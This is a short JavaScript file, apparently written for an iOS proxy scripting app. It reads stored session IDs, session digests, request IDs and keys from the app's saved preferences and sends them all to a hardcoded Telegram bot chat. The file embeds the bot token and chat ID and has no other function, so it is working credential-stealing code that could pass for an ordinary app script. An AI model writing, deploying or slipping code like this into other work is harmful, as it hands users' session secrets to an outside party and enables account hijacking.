/*
Script Author: Yui Chy
*/

const token = "1759212113:AAEQVd73Ym_dJtgBqQHCQ0ihD9mvhfb59DU";
const chatId = "-1001797215512";

const session_id = $prefs.valueForKey("session_id");
const session_digest = $prefs.valueForKey("session_digest");
const request_id = $prefs.valueForKey("request_id");
const key = $prefs.valueForKey("key");

if (session_id && session_digest && request_id && key) {
  const data = {
    session_id: session_id,
    session_digest: session_digest,
    request_id: request_id,
    key: key
  };

  sendToTelegram(data);
}

function sendToTelegram(data) {
  const message = JSON.stringify(data);
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  const options = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  };

  $task.fetch(url, options).then(response => {
    if (response.statusCode === 200) {
      console.log("Thông tin đã được gửi lên Telegram thành công.");
    } else {
      console.log("Có lỗi xảy ra khi gửi thông tin lên Telegram.");
    }
  }).catch(error => {
    console.log("Có lỗi xảy ra khi gửi thông tin lên Telegram:", error);
  });
}
